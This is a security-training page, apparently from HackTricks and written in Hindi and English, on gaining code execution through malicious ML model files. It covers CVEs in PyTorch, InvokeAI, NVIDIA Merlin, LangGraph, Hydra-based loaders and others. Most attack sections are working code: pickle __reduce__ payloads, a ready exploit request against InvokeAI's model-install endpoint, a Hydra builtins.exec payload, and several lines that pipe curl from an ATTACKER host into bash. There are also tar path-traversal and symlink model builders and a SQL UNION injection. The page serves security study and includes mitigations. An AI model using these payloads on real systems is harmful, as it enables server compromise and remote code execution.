# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Models को RCE के लिए लोड करना

Machine Learning models आमतौर पर ONNX, TensorFlow, PyTorch आदि जैसे अलग-अलग formats में share किए जाते हैं। इन models को developers की machines या production systems में उपयोग करने के लिए लोड किया जा सकता है। आमतौर पर models में malicious code नहीं होना चाहिए, लेकिन कुछ मामलों में model का उपयोग system पर arbitrary code execute करने के लिए किया जा सकता है, या तो intended feature के रूप में या model loading library की vulnerability के कारण।

इस लेखन के समय इस प्रकार की vulnerabilities के कुछ उदाहरण ये हैं:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Model checkpoint में malicious pickle code execution कराता है (`weights_only` safeguard को bypass करके)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download से code execution होता है; management API में Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` के माध्यम से Unsafe checkpoint deserialization **(CVE-2025-23298)**                                           | Untrusted checkpoint `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer trigger करता है → ML worker में code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key SQL/JSON-path syntax inject करती है, `UNION SELECT` एक fake checkpoint row बनाता है, फिर `msgpack` deserialization attacker-chosen Python code को import और call करता है | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से model लोड करने पर `yaml.unsafe_load` का उपयोग होता है (code exec) <br> **Lambda** layer के साथ model लोड करने पर arbitrary Python code run होता है          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model integer overflow trigger करता है → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` के माध्यम से model लोड करने पर attacker के `__reduce__` payload वाला pickle execute होता है                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default ने pickled object arrays की अनुमति दी – malicious `.npy/.npz` code exec trigger करता है                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model का external-weights path directory से बाहर जा सकता है (arbitrary files read) <br> Malicious ONNX model tar arbitrary files overwrite कर सकता है (जिससे RCE हो सकता है) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Custom operator वाले model को attacker का native code लोड करना पड़ता है; complex model graphs logic का दुरुपयोग करके unintended computations execute करते हैं   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` enabled होने पर model-load API का उपयोग relative path traversal के माध्यम से files लिखने की अनुमति देता है (जैसे RCE के लिए `.bashrc` overwrite करना)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file parser में heap buffer overflows कराती है, जिससे victim system पर arbitrary code execution संभव होता है                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda layer वाला malicious HDF5 (`.h5`) model लोड होने पर code execute करता रहता है (Keras safe_mode पुराने format को cover नहीं करता – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | कई ML tools (जैसे pickle-based model formats, Python `pickle.load`) mitigation न होने पर model files में embedded arbitrary code execute करेंगे | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()` को दिया गया Untrusted metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config `_target_` को arbitrary callable (जैसे `builtins.exec`) पर set करता है → load के दौरान execute होता है, “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) के साथ भी | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

इसके अलावा, [PyTorch](https://github.com/pytorch/pytorch/security) द्वारा उपयोग किए जाने वाले models जैसे कुछ Python pickle-based models भी system पर arbitrary code execute करने के लिए उपयोग किए जा सकते हैं, यदि उन्हें `weights_only=True` के साथ लोड नहीं किया जाता। इसलिए, कोई भी pickle-based model इस प्रकार के attacks के प्रति विशेष रूप से susceptible हो सकता है, भले ही वह ऊपर दी गई table में listed न हो।

### Hydra metadata → RCE (safetensors के साथ भी काम करता है)

`hydra.utils.instantiate()` configuration/metadata object में मौजूद किसी भी dotted `_target_` को import और call करता है। जब libraries **untrusted model metadata** को `instantiate()` में pass करती हैं, तो attacker ऐसा callable और arguments दे सकता है जो model load के दौरान तुरंत run हो जाएं (pickle की आवश्यकता नहीं होती)।<sup>[[12]](#references)</sup>

Payload example (`.nemo` `model_config.yaml`, repo `config.json`, या `.safetensors` के अंदर `__metadata__` में काम करता है):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
मुख्य बिंदु:
- NeMo के `restore_from/from_pretrained`, uni2TS HuggingFace coders और FlexTok loaders में model initialization से पहले trigger होता है।
- Hydra की string block-list को alternative import paths (जैसे, `enum.bltns.eval`) या application-resolved names (जैसे, `nemo.core.classes.common.os.system` → `posix`) के माध्यम से bypass किया जा सकता है।
- FlexTok `ast.literal_eval` के साथ stringified metadata को भी parse करता है, जिससे Hydra call से पहले DoS (CPU/memory blowup) संभव हो जाता है।

### 🆕  `torch.load` के माध्यम से InvokeAI RCE (CVE-2024-12029)

`InvokeAI` Stable-Diffusion के लिए एक लोकप्रिय open-source web interface है। **5.3.1 – 5.4.2** versions का REST endpoint `/api/v2/models/install` users को arbitrary URLs से models download और load करने की अनुमति देता है।<sup>[[1]](#references)</sup>

Internally endpoint अंततः यह call करता है:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
जब दी गई file एक **PyTorch checkpoint (`*.ckpt`)** होती है, तो `torch.load` **pickle deserialization** करता है। चूंकि content सीधे user-controlled URL से आता है, इसलिए attacker checkpoint के अंदर custom `__reduce__` method वाला malicious object embed कर सकता है; यह method **deserialization के दौरान** execute होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो जाता है।

इस vulnerability को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) assigned किया गया।

#### Exploitation walk-through

1. एक malicious checkpoint बनाएं:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. अपने नियंत्रण वाले HTTP server पर `payload.ckpt` host करें (जैसे, `http://ATTACKER/payload.ckpt`)।
3. vulnerable endpoint को trigger करें (authentication आवश्यक नहीं है):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. जब InvokeAI file को download करता है, तो यह `torch.load()` को call करता है → `os.system` gadget run होता है और attacker को InvokeAI process के context में code execution मिल जाता है।

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरे flow को automate करता है।<sup>[[3]](#references)</sup>

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` attacker के लिए reachable हो  
•  Process के पास shell commands execute करने की permissions हों  

#### Mitigations

* **InvokeAI ≥ 5.4.3** पर upgrade करें – patch default रूप से `scan=True` सेट करता है और deserialization से पहले malware scanning करता है।
* Checkpoints को programmatically load करते समय `torch.load(file, weights_only=True)` या नए [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper का उपयोग करें।
* Model sources के लिए allow-lists / signatures लागू करें और service को least-privilege के साथ run करें।

> ⚠️ याद रखें कि कोई भी Python pickle-based format (जिसमें कई `.pt`, `.pkl`, `.ckpt`, `.pth` files शामिल हैं) untrusted sources से deserialize करना inherently unsafe है।

---

यदि आपको पुराने InvokeAI versions को reverse proxy के पीछे चलाते रहना आवश्यक हो, तो ad-hoc mitigation का एक उदाहरण:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec में unsafe `torch.load` के माध्यम से RCE (CVE-2025-23298)

NVIDIA के Transformers4Rec (Merlin का हिस्सा) में एक unsafe checkpoint loader था, जो user-provided paths पर सीधे `torch.load()` को call करता था। क्योंकि `torch.load` Python `pickle` पर निर्भर करता है, attacker-controlled checkpoint deserialization के दौरान reducer के माध्यम से arbitrary code execute कर सकता है।<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

यह RCE क्यों होता है: Python pickle में कोई object ऐसा reducer (`__reduce__`/`__setstate__`) define कर सकता है, जो एक callable और arguments return करता है। Unpickling के दौरान callable execute होता है। यदि ऐसा object checkpoint में मौजूद हो, तो यह किसी भी weights के उपयोग से पहले run हो जाता है।

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors और blast radius:
- repos, buckets या artifact registries के माध्यम से साझा किए गए Trojanized checkpoints/models
- Automated resume/deploy pipelines जो checkpoints को automatically load करती हैं
- Execution training/inference workers के अंदर होता है, अक्सर elevated privileges के साथ (जैसे containers में root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने direct `torch.load()` को `transformers4rec/utils/serialization.py` में implemented restricted, allow-listed deserializer से replace किया। नया loader types/fields को validate करता है और load के दौरान arbitrary callables को invoke होने से रोकता है।<sup>[[7]](#references)</sup>

PyTorch checkpoints के लिए specific Defensive guidance:
- Untrusted data को unpickle न करें। संभव होने पर [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX जैसे non-executable formats को prefer करें।
- यदि आपको PyTorch serialization का उपयोग करना ही पड़े, तो सुनिश्चित करें कि `weights_only=True` हो (नए PyTorch versions में supported) या Transformers4Rec patch के समान custom allow-listed unpickler का उपयोग करें।
- Model provenance/signatures लागू करें और deserialization को sandbox करें (seccomp/AppArmor; non-root user; restricted FS और no network egress)।
- Checkpoint load के समय ML services से unexpected child processes के लिए monitor करें; `torch.load()`/`pickle` usage को trace करें।

POC और vulnerable/patch references:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – malicious PyTorch model तैयार करना

- Model बनाएं:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Model load करें:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent का FaceDetection-DSFD एक `resnet` endpoint expose करता है, जो user-controlled data को deserialize करता है। ZDI ने पुष्टि की कि एक remote attacker किसी victim को malicious page/file load करने के लिए मजबूर कर सकता है, उस endpoint पर crafted serialized blob push करवा सकता है और `root` के रूप में deserialization trigger कर सकता है, जिससे full compromise हो सकता है।

Exploit flow typical pickle abuse जैसा है:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Deserialization के दौरान reachable कोई भी gadget (constructors, `__setstate__`, framework callbacks आदि) उसी तरीके से weaponize किया जा सकता है, भले ही transport HTTP, WebSocket या watched directory में drop की गई file हो।

### LangGraph checkpointer SQLi → MessagePack RCE

यह attack chain इसलिए interesting है क्योंकि attacker को **malicious model file upload करने की जरूरत नहीं होती**। इसके बजाय, application एक **AI-agent persistence API** (`get_state_history(..., filter=...)`) expose करती है और user input checkpointer query builder तक पहुंचता है।

#### 1. Metadata filters में Structural SQLi

एक vulnerable SQLite pattern कुछ इस तरह था:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
मूल्य बाद में bind किया जाता है, लेकिन `query_key` को **JSON path string** में concatenate किया जाता है, इसलिए dictionary key के अंदर मौजूद `'`, `'$.{query_key}'` से बाहर निकलकर SQL inject कर देता है। यही lesson **JSON paths, identifiers, operators, `LIMIT`, और TTL fields** पर भी लागू होता है: placeholders केवल values को protect करते हैं, structural query syntax को नहीं।

#### 2. `UNION SELECT` केवल data theft तक सीमित नहीं है; यह downstream sinks को भी target कर सकता है

यह query `type` और serialized `checkpoint` bytes लौटाती है, जिन्हें बाद में इस रूप में consume किया जाता है:
```python
self.serde.loads_typed((type, checkpoint))
```
इसका मतलब है कि `WHERE` clause में एक SQLi एक **नकली result row** inject कर सकता है:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
यदि बाद का code किसी selected column को parse, deserialize, write या execute करता है, तो उन columns को उनके sinks से map करें। इस मामले में fake row SQLi को **attacker-controlled deserialization** में बदल देती है।

#### 3. Unsafe MessagePack extension hooks code gadgets के equivalent हैं

LangGraph के `msgpack` path में एक custom extension hook का उपयोग किया गया था, जो एक nested tuple को unpack करके यह execute करता था:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
इसलिए `("os", "system", "id > /tmp/pwned")` के समकक्ष किसी MessagePack extension object का encoding `os` को import करता है, `system` को resolve करता है और command चलाता है। AI frameworks की समीक्षा करते समय **custom MessagePack/JSON/pickle revivers** में dynamic imports, reflection या arbitrary callable dispatch की जांच करें।

#### 4. Agent frameworks के लिए Practical audit pattern

किसी भी user-controlled input की समीक्षा करें जो इन तक पहुंचता हो:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders जो SQL या Redis query fragments generate करते हैं
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths जो persistence layer से लौटाई गई rows पर trust करते हैं

यह specific chain SQLite या Redis checkpointers का उपयोग करने वाले self-hosted LangGraph deployments को प्रभावित करती थी, जब untrusted users `filter` को control कर सकते थे। Disclosure में बताए गए patched versions `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, और `langgraph-checkpoint 4.0.1+` थे।<sup>[[15]](#references)</sup>

## Models से Path Traversal

जैसा कि [**इस blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में बताया गया है, अलग-अलग AI frameworks द्वारा उपयोग किए जाने वाले अधिकांश model formats archives पर आधारित होते हैं, आमतौर पर `.zip` पर। इसलिए इन formats का दुरुपयोग करके Path Traversal attacks करना संभव हो सकता है, जिससे उस system से arbitrary files पढ़ी जा सकती हैं जहां model load किया जाता है।<sup>[[16]](#references)</sup>

उदाहरण के लिए, निम्नलिखित code से आप ऐसा model बना सकते हैं जो load होने पर `/tmp` directory में एक file create करेगा:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
या, निम्नलिखित code के साथ आप एक ऐसा model बना सकते हैं जो load किए जाने पर `/tmp` directory के लिए symlink बनाएगा:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### गहराई से अध्ययन: Keras .keras deserialization और gadget hunting

.keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue और allowlist के अंदर post-fix gadget discovery के लिए एक केंद्रित guide देखें:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Pivoting Archive Slip Bugs into High-Value AI/ML Bounties](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
